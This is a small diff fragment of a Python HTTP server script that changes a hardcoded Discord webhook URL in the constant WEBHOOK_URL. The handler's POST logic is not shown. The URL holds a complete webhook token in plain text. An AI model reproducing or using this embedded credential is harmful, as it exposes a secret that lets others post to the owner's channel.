@@ -5,7 +5,7 @@ import urllib.request
 import base64
 import uuid
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1532553921095270530/dP3FzsnMbetZfkPN3HuRAkDY_xNCgfNekonHwPoE4F_MQRmA-6v6-BC5hWbnBc2mmWK"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1532553921095270530/dP3FzsnWbetZfkPN3HuRAKDY_xNCgfNekonHwEPoE4F_MQRmA-6v6-BC5hWbmBc2mmWK"
 
 class MyHandler(SimpleHTTPRequestHandler):
     def do_POST(self):
